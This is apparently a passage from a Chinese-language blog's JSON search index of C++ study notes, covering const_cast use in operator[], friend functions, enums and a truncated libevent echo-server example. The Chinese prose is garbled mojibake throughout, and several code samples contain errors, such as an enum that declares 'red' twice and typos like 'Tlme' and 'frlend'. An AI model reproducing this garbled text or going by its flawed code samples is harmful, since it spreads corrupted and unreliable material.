ä½œä¸ºä¸€èˆ¬è§„åˆ™ï¼Œè½¬å‹æ˜¯ä¸€ä¸ªç³Ÿç³•çš„æƒ³æ³•ï¼Œåœ¨å®éªŒã€Šå°½é‡å°‘ç±»å‹è½¬æ¢ã€‹æ•´ä¸ªå®éªŒæ¥è®¨è®ºè¿™ä¸ªé—®é¢˜ï¼Œä½†ä»£ç é‡å¤ä¹Ÿä¸æ˜¯ä»€ä¹ˆå¥½äº‹ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œconst operator[] æ‰€åšçš„ä¸ operator[] æ‰€åšçš„äº‹æƒ…ç›¸åŒï¼Œåªæœ‰å¸¸é‡ç‰ˆæœ¬è¿”å›å€¼ç±»å‹å—åˆ°å¸¸é‡çº¦æŸã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°†è¿”å›å€¼ä¸­çš„ const è½¬å‹æ˜¯å®‰å…¨çš„ã€‚å› ä¸ºä¸è®ºè°ƒç”¨ operator[] è¿˜æ˜¯ const operator[] éƒ½ä¸€å®šé¦–å…ˆæœ‰ä¸ªéå¸¸é‡å¯¹è±¡ï¼Œå¦åˆ™å°±ä¸èƒ½å¤Ÿè°ƒç”¨éå¸¸é‡å‡½æ•°ã€‚æ‰€ä»¥ç”¨ operator[] è°ƒç”¨ const operator[] æ˜¯ä¸€ä¸ªé¿å…ä»£ç é‡å¤çš„å®‰å…¨åšæ³•ï¼Œå³ä½¿è¿‡ç¨‹ä¸­éœ€è¦ä¸€ä¸ªè½¬å‹åŠ¨ä½œã€‚ 12345678910111213141516171819202122232425262728// safeCast.h#ifndef __TEXTBLOCK_H__#define __TEXTBLOCK_H__#include &lt;iostream&gt;#include &lt;cstring&gt;class TextBlock&#123;public: const char&amp; operator[](std::size_t position) const &#123; // è¾¹ç•Œæ£€æŸ¥ // æ—¥å¿—æ•°æ®è®¿é—® // éªŒè¯æ•°æ®å®Œæ•´æ€§ return text[position]; &#125; char&amp; operator[](std::size_t position) &#123; return const_cast&lt;char&amp;&gt;(static_cast&lt;const TextBlock&amp;&gt;(*this)[position]); &#125;private: std::string text;&#125;;#endif // __TEXTBLOCK_H__ å¦‚ç¤ºä¾‹ä»£ç æ‰€ç¤ºï¼Œä»£ç æœ‰ä¸¤ä¸ªè½¬å‹ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªã€‚ç¬¬ä¸€æ¬¡ç”¨æ¥ä¸º *this æ·»åŠ  const ä½¿å¾— operator[] å¯ä»¥è°ƒç”¨ const operator[]ï¼Œç¬¬äºŒæ¬¡åˆ™æ˜¯ä» const operator[] çš„è¿”å›å€¼ä¸­å»é™¤å¸¸é‡æ€§ã€‚ ç¤ºä¾‹ä»£ç ä¸­ä½¿ç”¨ operator[] è°ƒç”¨ const operator[]ï¼Œä½†å¦‚æœåªæ˜¯å•çº¯çš„è°ƒç”¨ä¼šé€’å½’è°ƒç”¨è‡ªå·±ï¼Œé‚£ä¹ˆä»£ç ä¼šä¸€ç›´é‡å¤è°ƒç”¨ã€‚ä¸ºäº†é¿å…æ— ç©·é€’å½’ï¼Œè°ƒç”¨æ—¶å¿…é¡»æ˜ç¡®æŒ‡å‡ºè°ƒç”¨çš„æ˜¯ const operator[]ã€‚ C++ ç¼ºä¹ç›´æ¥çš„è¯­æ³•å¯ä»¥å»è°ƒç”¨ï¼Œå› æ­¤å°† *this ä»å…¶åŸå§‹ç±»å‹ TextBlock&amp; è½¬å‹ä¸º const TextBlock&amp;ã€‚ ä½¿ç”¨ static_cast æ·»åŠ å¸¸é‡æ€§ï¼Œå¼ºåˆ¶è¿›è¡Œäº†ä¸€æ¬¡å®‰å…¨è½¬å‹ï¼›å†ä½¿ç”¨ const_cast å»é™¤å¸¸é‡æ€§ã€‚ const ä¿®é¥°æˆå‘˜å‡½æ•°","tags":[{"name":"C++","slug":"C","permalink":"https://hodlyounger.github.io/tags/C/"},{"name":"cpp/effectivecpp","slug":"cpp-effectivecpp","permalink":"https://hodlyounger.github.io/tags/cpp-effectivecpp/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"ã€ŠEfficient C++ã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠEfficient-C-ã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AEfficient-C-%E3%80%8B/"}]},{"title":"å‹å…ƒ","date":"2023-10-27T01:24:02.446Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠC++ primer plusã€‹/ç¬¬11ç«  ä½¿ç”¨ç±»/ã€CPPã€‘å‹å…ƒ/","text":"æ¦‚è¿°ï¼šC++ å‹å…ƒ [toc] å‹å…ƒ C++ æä¾›äº†å¦å¤–ä¸€ç§å½¢å¼çš„è®¿é—®æƒé™ï¼šå‹å…ƒã€‚å‹å…ƒæœ‰3ç§ï¼š å‹å…ƒå‡½æ•° å‹å…ƒç±» å‹å…ƒæˆå‘˜å‡½æ•° é€šè¿‡è®©å‡½æ•°æˆä¸ºç±»çš„å‹å…ƒï¼Œå¯ä»¥èµ‹äºˆè¯¥å‡½æ•°ä¸ç±»çš„æˆå‘˜å‡½æ•°ç›¸åŒçš„è®¿é—®æƒé™ã€‚ ä¸ºä½•éœ€è¦å‹å…ƒ åœ¨ä¸ºç±»é‡è½½äºŒå…ƒè¿ç®—ç¬¦æ—¶ï¼ˆå¸¦ä¸¤ä¸ªå‚æ•°çš„è¿ç®—ç¬¦ï¼‰å¸¸å¸¸éœ€è¦å‹å…ƒã€‚å°† Time å¯¹è±¡ä¹˜ä»¥å®æ•°å°±å±äºè¿™ç§æƒ…å†µã€‚ ä¸‹é¢çš„è¯­å¥ï¼š 1A = B * 2.75ï¼› å°†è¢«è½¬æ¢æˆï¼š 1A = B.operator*(2.75); ä½†ä¸‹é¢çš„è¯­å¥åˆå¦‚ä½•å‘¢? 1A = 2.75 * B; ä»æ¦‚å¿µä¸Šè¯´ï¼Œ2.75*B ä¸ B*2.75 ç›¸åŒï¼Œä½†ç¬¬ä¸€ä¸ªè¡¨è¾¾å¼ä¸å¯¹åº”äºæˆå‘˜å‡½æ•°ï¼Œå› ä¸º2.75ä¸æ˜¯ Timer ç±»å‹çš„å¯¹è±¡ã€‚è®°ä½ï¼Œå·¦ä¾§çš„æ“ä½œæ•°åº”æ˜¯è°ƒç”¨å¯¹è±¡ï¼Œä½†2.75ä¸æ˜¯å¯¹è±¡ã€‚å› æ­¤ï¼Œç¼–è¯‘å™¨ä¸èƒ½ä½¿ç”¨æˆå‘˜å‡½æ•°è°ƒç”¨æ¥æ›¿æ¢è¯¥è¡¨è¾¾å¼ã€‚ è§£å†³è¿™ä¸ªéš¾é¢˜çš„ä¸€ç§æ–¹å¼æ˜¯ï¼Œå‘ŠçŸ¥æ¯ä¸ªäººï¼ˆåŒ…æ‹¬ç¨‹åºå‘˜è‡ªå·±ï¼‰ï¼Œåªèƒ½æŒ‰ B*2.75 çš„æ ¼å¼ç¼–å†™ï¼Œä¸èƒ½å†™æˆ2.75*Bã€‚è¿™æ˜¯ä¸€ç§å¯¹æœåŠ¡å™¨å‹å¥½-å®¢æˆ·è­¦æƒ•çš„ï¼ˆserver-friendly, client-beware)è§£å†³æ–¹æ¡ˆï¼Œä¸OOPæ— å…³ã€‚ å½“ç„¶ï¼Œä¸Šè¿°çš„é—®é¢˜ä¹Ÿæœ‰è§£å†³æ–¹æ¡ˆâ€”â€”éæˆå‘˜å‡½æ•°ã€‚éæˆå‘˜å‡½æ•°ä¸æ˜¯ç”±å¯¹è±¡è°ƒç”¨çš„ï¼Œå®ƒä½¿ç”¨çš„æ‰€æœ‰å€¼ï¼ˆåŒ…æ‹¬å¯¹è±¡ï¼‰éƒ½æ˜¯æ˜¾å¼å‚æ•°ã€‚è¿™æ ·ï¼Œç¼–è¯‘å™¨èƒ½å¤Ÿå°†ä¸‹é¢çš„è¡¨è¾¾å¼: 1A = 2.75 * B; ä¸ä¸‹é¢çš„éæˆå‘˜å‡½æ•°è°ƒç”¨åŒ¹é…ï¼š 1A = operator*(2.75,B); è¯¥å‡½æ•°çš„åŸå‹å¦‚ä¸‹ï¼š 1Time operator*(double m, const Time &amp;t); å¯¹äºéæˆå‘˜é‡è½½è¿ç®—ç¬¦å‡½æ•°æ¥è¯´ï¼Œè¿ç®—ç¬¦è¡¨è¾¾å¼å·¦è¾¹çš„æ“ä½œæ•°å¯¹åº”äºè¿ç®—ç¬¦å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè¿ç®—ç¬¦è¡¨è¾¾å¼å³è¾¹çš„æ“ä½œæ•°å¯¹åº”äºè¿ç®—ç¬¦å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚è€ŒåŸæ¥çš„æˆå‘˜å‡½æ•°å¯ä»¥è®¿é—®ç±»çš„ç§æœ‰æˆå‘˜ï¼Œå®ƒä»¬è¢«ç§°ä¸ºå‹å…ƒå‡½æ•°ã€‚ åˆ›å»ºå‹å…ƒ åˆ›å»ºå‹å…ƒå‡½æ•°çš„ç¬¬ä¸€æ­¥æ˜¯å°†å…¶åŸå‹æ”¾åœ¨ç±»å£°æ˜ä¸­ï¼Œå¹¶åœ¨åŸå‹å£°æ˜å‰åŠ ä¸Šå…³é”®å­— friend: 1friend Time operator*(double m, const Time &amp; t); è¯¥åŸå‹æ„å‘³ç€ä¸‹é¢ä¸¤ç‚¹ï¼š è™½ç„¶ operator*() å‡½æ•°æ˜¯åœ¨ç±»å£°æ˜ä¸­å£°æ˜çš„ï¼Œä½†å®ƒä¸æ˜¯æˆå‘˜å‡½æ•°ï¼Œå› æ­¤ä¸èƒ½ä½¿ç”¨æˆå‘˜è¿ç®—ç¬¦æ¥è°ƒç”¨ï¼› è™½ç„¶ operator*() å‡½æ•°ä¸æ˜¯æˆå‘˜å‡½æ•°ï¼Œä½†å®ƒä¸æˆå‘˜å‡½æ•°çš„è®¿é—®æƒé™ç›¸åŒã€‚ ç¬¬äºŒæ­¥æ˜¯ç¼–å†™å‡½æ•°å®šä¹‰ã€‚å› ä¸ºå®ƒä¸æ˜¯æˆå‘˜å‡½æ•°ï¼Œæ‰€ä»¥ä¸è¦ä½¿ç”¨ Time:: é™å®šç¬¦ã€‚å¦å¤–ï¼Œä¸è¦åœ¨å®šä¹‰ä¸­ä½¿ç”¨å…³é”®å­— friendï¼Œå®šä¹‰å¦‚ä¸‹ï¼š 12345678Time operator*(double m,const Tlme &amp; t)// frlend not ued in definition&#123; Time result; long totalminutes = t.hours * m * 60 + t.minutes * m; result.hours = totalminutes/60; result.minutes = totalminutes % 60; return result;&#125; æ€»ä¹‹ï¼Œç±»çš„å‹å…ƒå‡½æ•°æ˜¯éæˆå‘˜å‡½æ•°ï¼Œå…¶è®¿é—®æƒé™ä¸æˆå‘˜å‡½æ•°ç›¸åŒã€‚","tags":[{"name":"ä¹¦ç±/ã€ŠCPP-primer-plusã€‹","slug":"ä¹¦ç±-ã€ŠCPP-primer-plusã€‹","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D-%E3%80%8ACPP-primer-plus%E3%80%8B/"},{"name":"cpp/å‹å…ƒ","slug":"cpp-å‹å…ƒ","permalink":"https://hodlyounger.github.io/tags/cpp-%E5%8F%8B%E5%85%83/"},{"name":"friend","slug":"friend","permalink":"https://hodlyounger.github.io/tags/friend/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"ã€ŠC++ primer plusã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠC-primer-plusã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AC-primer-plus%E3%80%8B/"},{"name":"ç¬¬11ç«  ä½¿ç”¨ç±»","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠC-primer-plusã€‹/ç¬¬11ç« -ä½¿ç”¨ç±»","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AC-primer-plus%E3%80%8B/%E7%AC%AC11%E7%AB%A0-%E4%BD%BF%E7%94%A8%E7%B1%BB/"}]},{"title":"ã€C++ã€‘æšä¸¾","date":"2023-10-27T01:24:02.444Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠC++ primer plusã€‹/ã€Cppã€‘enum/","text":"æ¦‚è¿°ï¼šC++æšä¸¾çš„è¯´æ˜å’Œä½¿ç”¨ [toc] æšä¸¾ C++çš„æšä¸¾å·¥å…·æä¾›äº†å¦ä¸€ç§åˆ›å»ºç¬¦å·å¸¸é‡çš„æ–¹å¼ï¼Œè¿™ç§æ–¹å¼å¯ä»¥ä»£æ›¿constã€‚è¿˜å…è®¸å®šä¹‰æ–°ç±»å‹ï¼Œä½†å¿…é¡»æŒ‰ä¸¥æ ¼çš„é™åˆ¶æ‰§è¡Œã€‚ä½¿ç”¨enumçš„å¥æ³•ä¸structç±»ä¼¼ã€‚ enum color &#123; red, orange, blue, green, red, black&#125; è¿™æ¡è¯­å¥å®šä¹‰äº†ä¸€ä¸ªåä¸ºcolorçš„æ–°ç±»å‹ï¼Œå®ƒçš„å–å€¼èŒƒå›´ä¸ºred, orange, blue, green, red, blackï¼Œç§°ä¸ºç¬¦å·å¸¸é‡ï¼ŒåŒæ—¶å°†0~5åˆ†åˆ«å¯¹åº”äºred~blackã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œ0å¯¹åº”çš„æ˜¯red,5å¯¹åº”çš„æ˜¯black,å…¶ä»–ä»¥æ­¤ç±»æ¨ã€‚ å£°æ˜ä¸ä½¿ç”¨ 1234color cor1; //å®šä¹‰äº†ä¸€ä¸ªç±»å‹ä¸ºcolorçš„å˜é‡cor1//æšä¸¾å˜é‡çš„èµ‹å€¼cor1 = red; //æ­£å¸¸èµ‹å€¼cor1 = 20; //éæ³•ï¼Œ20ä¸æ˜¯æšä¸¾å˜é‡ ç”±æ­¤å¯ä»¥çœ‹å‡ºï¼Œæšä¸¾å˜é‡çš„èµ‹å€¼å—åˆ°é™åˆ¶ï¼Œä¸ç¨‹åºå‘˜çš„å®šä¹‰æœ‰å…³ã€‚ å¯¹æšä¸¾è€Œè¨€ï¼Œå®ƒçš„æ“ä½œç¬¦åªæœ‰èµ‹å€¼è¿ç®—ç¬¦=ï¼Œè¿™å°±æ„å‘³ç€æšä¸¾å˜é‡ä¸èƒ½æ‰§è¡Œ++ã€--ã€+ã€â€”ç­‰ç­‰å·ä»¥å¤–çš„æ“ä½œã€‚ æšä¸¾é‡æ˜¯æ•´å½¢ï¼Œå¯è¢«æå‡ä¸ºintç±»å‹ï¼Œä½†intç±»å‹ä¸èƒ½è‡ªåŠ¨è½¬æ¢ä¸ºæšä¸¾ç±»å‹ æšä¸¾å¯ä»¥è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œä½†ä¸ç¡®å®šå…¶ç»“æœï¼Œå¦‚cor1 = spectrum(100); å¦‚æœåªæ‰“ç®—ä½¿ç”¨å¸¸é‡ï¼Œè€Œä¸åˆ›å»ºæšä¸¾ç±»å‹çš„å˜é‡ï¼Œåˆ™å¯ä»¥çœç•¥æšä¸¾ç±»å‹çš„åç§° enum &#123;red,orange&#125;ï¼› è®¾ç½®æšä¸¾çš„å€¼ å¯ä»¥ä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦æ˜¾å¼åœ°æ¥è®¾ç½®æšä¸¾é‡çš„å€¼ï¼š 1enum bits &#123;one = 1, two = 2, three = 3&#125;; ä½†æ˜¯ï¼ŒæŒ‡å®šçš„å€¼å¿…é¡»æ˜¯æ•´æ•°ã€‚ä¹Ÿå¯ä»¥åªæ˜¾å¼çš„è®¾ç½®å…¶ä¸­ä¸€éƒ¨åˆ†çš„å€¼ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæšä¸¾çš„ ç¬¬ä¸€ä¸ªå¸¸é‡å§‹ç»ˆæ˜¯ä»0å¼€å§‹çš„ï¼Œè¿™ä¸€ç‚¹éœ€è¦æ³¨æ„ã€‚ 1enum digits &#123;zero, one = 0, two, three = 1&#125;; è¿™é‡Œï¼Œzeroå’Œoneçš„æšä¸¾é‡éƒ½ä¸º0,twoå’Œthreeéƒ½æ˜¯1ã€‚ é™¤äº†å¯ä»¥å°†intç±»å‹çš„å€¼èµ‹å€¼ç»™æšä¸¾é‡ï¼Œè¿˜å¯ä»¥ä½¿ç”¨longå’Œlong longç±»å‹çš„å€¼ã€‚ æšä¸¾çš„å–å€¼èŒƒå›´ ç°åœ¨æœ‰æŒ‡å®šäº†æšä¸¾é‡çš„æšä¸¾å¦‚ä¸‹æ‰€ç¤ºï¼š 123enum bits(one = 1, two = 2,four = 4,eight = 8&#125;;bits myflag;myflag = bits(6); é—®ï¼š ä¸Šè¿°èµ‹å€¼æ˜¯å¦åˆæ³• åˆæ³•ï¼Œè™½ç„¶`6`ä¸æ˜¯æšä¸¾é‡ï¼Œä½†å®ƒä½äºæšä¸¾å®šä¹‰çš„å–å€¼èŒƒå›´å†…ã€‚ å…³äºå–å€¼èŒƒå›´çš„å®šä¹‰ï¼ˆå‚è€ƒC++ primer ç¬¬å…­ç‰ˆï¼‰ï¼š 1enum bigstep(firat,second = 100, third&#125;; é¦–å…ˆï¼Œè¦æ‰¾å‡ºä¸Šé™ï¼Œéœ€è¦çŸ¥é“æšä¸¾é‡çš„æœ€å¤§å€¼ã€‚æ‰¾åˆ°å¤§äºè¿™ä¸ªæœ€å¤§å€¼çš„ã€æœ€å°çš„2çš„å¹‚ï¼Œå°†å®ƒå‡å»1ï¼Œå¾—åˆ°çš„ä¾¿æ˜¯å–å€¼èŒƒå›´çš„ä¸Šé™ã€‚ä¾‹å¦‚ï¼Œå®šä¹‰çš„bigstepçš„æœ€å¤§å€¼æšä¸¾å€¼æ˜¯101ã€‚åœ¨2çš„å¹‚ä¸­ï¼Œæ¯”è¿™ä¸ªæ•°å¤§çš„æœ€å°å€¼ä¸º128ï¼Œå› æ­¤å–å€¼èŒƒå›´çš„ä¸Šé™ä¸º127ã€‚è¦è®¡ç®—ä¸‹é™ï¼Œéœ€è¦çŸ¥é“æšä¸¾é‡çš„æœ€å°å€¼ã€‚å¦‚æœå®ƒä¸å°äº0ï¼Œåˆ™å–å€¼èŒƒå›´çš„ä¸‹é™ä¸º0âˆ¶å¦åˆ™ï¼Œé‡‡ç”¨ä¸å¯»æ‰¾ä¸Šé™æ–¹å¼ç›¸åŒçš„æ–¹å¼ï¼Œä½†åŠ ä¸Šè´Ÿå·ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæœ€å°çš„æšä¸¾é‡ä¸º-6ï¼Œè€Œæ¯”å®ƒå°çš„ã€æœ€å¤§çš„2çš„å¹‚æ˜¯-8ï¼ˆåŠ ä¸Šè´Ÿå·ï¼‰ï¼Œå› æ­¤ä¸‹é™ä¸º-7ã€‚é€‰æ‹©ç”¨å¤šå°‘ç©ºé—´æ¥å­˜å‚¨æšä¸¾ç”±ç¼–è¯‘å™¨å†³å®šã€‚å¯¹äºå–å€¼èŒƒå›´è¾ƒå°çš„æšä¸¾ï¼Œä½¿ç”¨ä¸€ä¸ªå­—èŠ‚æˆ–æ›´å°‘çš„ç©ºé—´âˆ¶è€Œå¯¹äºåŒ…å« longç±»å‹å€¼çš„æšä¸¾ï¼Œåˆ™ä½¿ç”¨4ä¸ªå­—èŠ‚ã€‚ åº”ç”¨å®ä¾‹ 1234567891011121314151617#include &lt;iostream&gt;#include &quot;main.h&quot;using namespace std;enum myFlag &#123; one, two = 0, three, four = 1&#125;;int main()&#123; cout &lt;&lt; three &lt;&lt; endl; myFlag flag = myFlag(0); cout &lt;&lt; flag &lt;&lt; endl; system(&quot;pause&quot;); return 0;&#125; è¾“å‡ºç»“æœï¼š 10 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; enum color &#123; red=1, green, blue &#125;; enum color favorite_color; /* ç”¨æˆ·è¾“å…¥æ•°å­—æ¥é€‰æ‹©é¢œè‰² */ printf(&quot;è¯·è¾“å…¥ä½ å–œæ¬¢çš„é¢œè‰²: (1. red, 2. green, 3. blue): &quot;); scanf(&quot;%u&quot;, &amp;favorite_color); /* è¾“å‡ºç»“æœ */ switch (favorite_color) &#123; case red: printf(&quot;ä½ å–œæ¬¢çš„é¢œè‰²æ˜¯çº¢è‰²&quot;); break; case green: printf(&quot;ä½ å–œæ¬¢çš„é¢œè‰²æ˜¯ç»¿è‰²&quot;); break; case blue: printf(&quot;ä½ å–œæ¬¢çš„é¢œè‰²æ˜¯è“è‰²&quot;); break; default: printf(&quot;ä½ æ²¡æœ‰é€‰æ‹©ä½ å–œæ¬¢çš„é¢œè‰²&quot;); &#125; return 0;&#125; è¯·è¾“å…¥ä½ å–œæ¬¢çš„é¢œè‰²: (1. red, 2. green, 3. blue): 1 ä½ å–œæ¬¢çš„é¢œè‰²æ˜¯çº¢è‰² æšä¸¾è¿›é˜¶ 1. ä½è¿ç®—æ”¯æŒ åœ¨ä½¿ç”¨æšä¸¾æ—¶ç»“åˆåˆ° 2è¿›åˆ¶ çš„å¼ºå¤§ï¼Œå¯¹æšä¸¾å€¼è‡ªç”±çš„è¿›è¡Œå¼‚æˆ–è¿ç®—ã€‚ ä¸¾ä¾‹ä¸€ï¼š 1234567enum AttributeTargets&#123; Assembly = 0x0001, Class = 0x0002, Struct = 0x0004 ...&#125;; ä¸¾ä¾‹äºŒï¼š ä½†æ˜¯åœ¨ 123456enum FileAccess&#123; Read = 0x1, Write = 0x2, ReadWrite = Read | Write&#125;; 2. 0å€¼ ä¸ºç®€å•æšä¸¾æä¾›ä¸€ä¸ª 0 å€¼æšä¸¾é‡ï¼Œå¯ä»¥è€ƒè™‘å°†å…¶å‘½åä¸º Noneã€‚å¦‚æœè¿™ä¸ªåå¯¹äºç‰¹å®šçš„æšä¸¾ä¸åˆé€‚çš„æ—¶å€™ï¼Œå¯ä»¥è‡ªè¡Œæ‰¾ä¸€ä¸ªå‡†ç¡®çš„ã€‚ 123456enum Compression&#123; None = 0, GZip, Deflate&#125;; 3. ç”¨æšä¸¾ä»£æ›¿define åœ¨åˆé€‚çš„æƒ…å†µä¸‹å°½é‡ä½¿ç”¨æšä¸¾ç±»å‹ï¼Œè€Œä¸æ˜¯é™æ€å¸¸é‡æˆ– â€œ#defineâ€ å€¼ ã€‚æšä¸¾ ç±»å‹æ˜¯ä¸€ä¸ªå…·æœ‰ä¸€ä¸ªé™æ€å¸¸é‡é›†åˆçš„ç»“æ„ä½“ã€‚å¦‚æœéµå®ˆè¿™äº›è§„èŒƒï¼Œå®šä¹‰æšä¸¾ç±»å‹ï¼Œè€Œä¸æ˜¯å¸¦ æœ‰é™æ€å¸¸é‡çš„ç»“æ„ä½“ï¼Œæ‚¨ä¾¿ä¼šå¾—åˆ°é¢å¤–çš„ç¼–è¯‘å™¨å’Œåå°„æ”¯æŒï¼Œåœ¨è°ƒè¯•ä»£ç æ—¶ä¹Ÿèƒ½æ›´åŠ ç›´è§‚ã€‚ Good: 1234567enum Color&#123; Red, Green, Blue&#125;; bad: 1234567const int RED = 0;const int GREEN = 1;const int BLUE = 2;#define RED 0#define GREEN 1#define BLUE 2","tags":[{"name":"ä¹¦ç±/ã€ŠCPP-primer-plusã€‹","slug":"ä¹¦ç±-ã€ŠCPP-primer-plusã€‹","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D-%E3%80%8ACPP-primer-plus%E3%80%8B/"},{"name":"CPP/enum","slug":"CPP-enum","permalink":"https://hodlyounger.github.io/tags/CPP-enum/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"ã€ŠC++ primer plusã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠC-primer-plusã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AC-primer-plus%E3%80%8B/"}]},{"title":"ã€libeventã€‘evconnlistener_new_bind(1)","date":"2023-10-27T01:24:02.442Z","path":"C_OpenSource/libevent/ã€libeventã€‘evconnlistener_new_bind(1)/","text":"æ¦‚è¿°ï¼šlibevent æ¥å£ evconnlistener_new_bind çš„ä½¿ç”¨è¯´æ˜ libeventå°è£…äº†ç›‘å¬å¥—æ¥å­—ï¼Œå°†å¥—æ¥å­—å’Œstruct eventç»Ÿä¸€ç®¡ç†ã€‚ å®˜æ–¹çš„è§£é‡Šæ˜¯ï¼š The evonnlistener mechanism gives you a way to listen for and accept incoming TCP connections é¦–å…ˆè¿˜æ˜¯å­¦ä¹ æ€ä¹ˆå»ä½¿ç”¨evconnlistener ï¼ˆä¸€ï¼‰æ¥å£ 1234567891011121314151617//åˆ›å»ºstruct evconnlistener *evconnlistener_new(struct event_base*base,evconnlistener_cb cb,void *ptr,unsigned flags ,int backlog,evutil_socket_t fd);struct evconnlistener*evconnlistener_new_bind(struct event_base*base,evconnlistener_cb cb,void *ptr,unsigned flags,int backlog,const struct sockaddr*sa,int socklen);void evconnlistener_free(struct evconnlistener*lev)//å…¶ä¸­callbackçš„å®šä¹‰å¦‚ä¸‹ï¼štypedef void (*evconnlistener_cb)(struct evconnlistener *listener,evutil_socket_t sock, struct sockaddr*addr,int len,void *ptr);//enable å’Œ disableint evconnlistener_disable(struct evconnlistener *lev);int evconnlistener_enable(struct evconnlistener *lev);//è°ƒæ•´callbackvoid evconnlistener_set_cb(struct evconnlistener*lev,evconnlistener_cb cb,void *arg)//æ£€æŸ¥evconnlistenerevutil_socket_t evconnlistener_get_fd(struct evconnlistener *lev)struct event_base *evconnlistener_get_base(struct evconnlistener*lev) evconnlisteneræ˜¯å¯¹ å¥—æ¥å­—å’Œevent çš„å°è£…ï¼Œå¯ä»¥æƒ³è§ï¼Œåœ¨è¿™äº›æ¥å£ä¸­ï¼Œé™¤äº†è°ƒç”¨socket apiä¹‹å¤–ï¼Œè¿˜ä¼šå…³è”å¥—æ¥å­åˆ°eventä¸Šè¿›è€Œæ³¨å†Œåˆ°event_baseä¸Šå» ä¸è¿‡æ¥å£å°è£…å¥½äº†è¿™äº›è¡Œä¸ºï¼Œåªéœ€è¦äº†è§£è¿™äº›å‚æ•°çš„å«ä¹‰å³å¯ã€‚ baseï¼šå³event_base cbï¼šå½“æœ‰æ–°è¿æ¥æ—¶è°ƒç”¨çš„å›è°ƒå‡½æ•° ptrï¼šcallbackçš„å‚æ•° flagsï¼šæ§åˆ¶listnerçš„è¡Œä¸º backlogï¼šåŒ listen(2)ä¸­backlogçš„å«ä¹‰ fdï¼šå·²ç»bindçš„fdï¼Œä¼ å…¥apiè®©libeventåšlistenè°ƒç”¨ ï¼ˆäºŒï¼‰ä¾‹å­ ä½¿ç”¨evconnlistenerç®¡ç†ç›‘å¬å¥—æ¥å­—æ„å»ºä¸€ä¸ªç®€å•çš„ echo server ä»£ç ä¹Ÿå¯å‚è€ƒgayhub 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;event2/listener.h&gt;#include &lt;event2/bufferevent.h&gt;#include &lt;event2/buffer.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;errno.h&gt;#include &lt;assert.h&gt;static void echo_read_cb(struct bufferevent*bev,void*ctx)&#123; struct evbuffer*input=bufferevent_get_input(bev); struct evbuffer*output=bufferevent_get_output(bev); evbuffer_add_buffer(output,input);&#125;static voidecho_event_cb(struct bufferevent*bev,short events,void*ctx)&#123; if(events&amp;BEV_EVENT_ERROR) perror(&quot;Error from bufferevent&quot;); if(events&amp;(BEV_EVENT_EOF|BEV_EVENT_ERROR)) &#123; bufferevent_free(bev); &#125;&#125;static voidaccept_error_cb(struct evconnlistener*listener,void*ctx)&#123; struct event_base*base=evconnlistener_get_base(listener); event_base_loopexit(base,NULL);&#125;void accept_conn_cb(struct evconnlistener*listener,evutil_socket_t fd,struct sockaddr*address,int socklen,void*ctx)&#123; struct event_base*base=evconnlistener_get_base(listener); struct bufferevent*bev = bufferevent_socket_new(base, fd, BEV_OPT_CLOSE_ON_FREE); bufferevent_setcb(bev,echo_read_cb,NULL,echo_event_cb,NULL); bufferevent_enable(bev,EV_READ|EV_WRITE);&#125;int main(int argc,char**argv)&#123; struct event_base *base; struct evconnlistener *listener; struct sockaddr_in sin; int port = 1025; base = event_base_new(); assert(base!=NULL); memset(&amp;sin,0,sizeof(sin)); sin.sin_family=AF_INET; sin.sin_addr.s_addr=htonl(0); 